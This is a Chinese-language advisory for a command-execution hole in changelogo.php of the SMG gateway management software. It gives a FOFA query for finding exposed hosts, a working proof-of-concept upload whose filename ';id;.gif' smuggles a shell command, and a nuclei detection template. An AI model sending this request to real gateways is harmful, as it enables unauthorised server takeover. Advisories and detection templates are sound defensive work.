# 杭州新威数字信息SMG网关管理软件 changelogo.php 命令执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 杭州新威数字信息SMG网关管理软件 changelogo.php 命令执行漏洞 |
| 漏洞类型 | 命令执行 |
| 影响组件 | 杭州新威数字信息SMG网关管理软件 |
| 影响版本 | SMG网关管理软件 |
| 严重程度 | 高危 |

## 漏洞概述

杭州新威数字信息SMG网关管理软件 changelogo.php 命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## 测绘语法

详见 `../../vulns/fofa-cache.md`

``` body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management") ```

## 漏洞复现

### POC

```
POST /changelogo.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=-WebKitFormBoundary1v98KI1jc9w1bG97

-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="file"; filename=";id;.gif"
Content-Type: image/gif

123321
-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="test"

-----WebKitFormBoundary1v98KI1jc9w1bG97--
```

#

 检测脚本

```yaml
﻿id: xinwei-smg-changelogo-rce

info:
  name: 杭州新威数字信息SMG网关 changelogo.php 命令执行
  author: vulns-reproduce
  severity: high
  description: 杭州新威数字信息SMG网关管理软件 changelogo.php 存在命令执行漏洞
  reference:
    - https://blog.wuyaoxuexi.cn
  tags: xinwei-smg,rce,command-execution

requests:
  - method: POST
    path:
      - "{{BaseURL}}/changelogo.php"
    headers:
      Content-Type: "multipart/form-data; boundary=-WebKitFormBoundary1v98KI1jc9w1bG97"
    body: |
      -----WebKitFormBoundary1v98KI1jc9w1bG97
      Content-Disposition: form-data; name="file"; filename=";id;.gif"
      Content-Type: image/gif

      123321
      -----WebKitFormBoundary1v98KI1jc9w1bG97
      Content-Disposition: form-data; name="test"

      -----WebKitFormBoundary1v98KI1jc9w1bG97--
    matchers:
      - type: word
        words:
          - "uid="
          - "www-data"
          - "root"
        part: body


```


## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限